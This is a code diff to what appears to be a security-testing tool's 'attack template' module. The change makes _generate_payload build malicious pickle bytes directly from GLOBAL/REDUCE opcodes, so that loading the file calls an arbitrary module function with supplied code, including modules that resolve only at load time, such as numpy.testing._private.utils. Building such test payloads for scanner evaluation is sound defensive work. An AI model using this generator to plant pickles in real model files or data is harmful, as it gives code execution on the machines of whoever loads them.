@@ -122,23 +122,25 @@ class ExternalModuleTemplate(AttackTemplate):
 
 
 def _generate_payload(module_name: str, class_name: str, payload_code: str) -> bytes:
-    """Generate the pickle bytes using a temporary placeholder class, cleaning up sys.modules afterwards."""
-    existed = module_name in sys.modules
-    cls = _get_placeholder_class(module_name, class_name)
+    """Generate pickle bytes that call ``module_name.class_name`` with payload_code.
 
-    class _PayloadHelper:
-        def __init__(self, target_cls, payload):
-            self.target_cls = target_cls
-            self.payload = payload
+    Built directly from opcodes (``GLOBAL <module> <name> <args> REDUCE POP STOP``)
+    so the module never has to be importable at dump time. Dotted modules such
+    as ``numpy.testing._private.utils`` are only resolvable at load time inside
+    the container image; the old placeholder-class approach made pickle.dumps
+    itself raise ``PicklingError`` ("No module named 'numpy'").
+    """
+    from pipeline.opcodes import OPCODES_BY_NAME
 
-        def __reduce__(self):
-            return (self.target_cls, (self.payload,))
-
-    try:
-        return pickle.dumps(_PayloadHelper(cls, payload_code))
-    finally:
-        if not existed:
-            sys.modules.pop(module_name, None)
+    args_bytes = pickle.dumps((payload_code,), protocol=2)[2:-1]  # strip PROTO/STOP
+    return (
+        OPCODES_BY_NAME["GLOBAL"].code
+        + f"{module_name}\n{class_name}\n".encode("latin1")
+        + args_bytes
+        + OPCODES_BY_NAME["REDUCE"].code
+        + OPCODES_BY_NAME["POP"].code
+        + OPCODES_BY_NAME["STOP"].code
+    )
 
 
 def _get_placeholder_class(module_name: str, class_name: str) -> type:
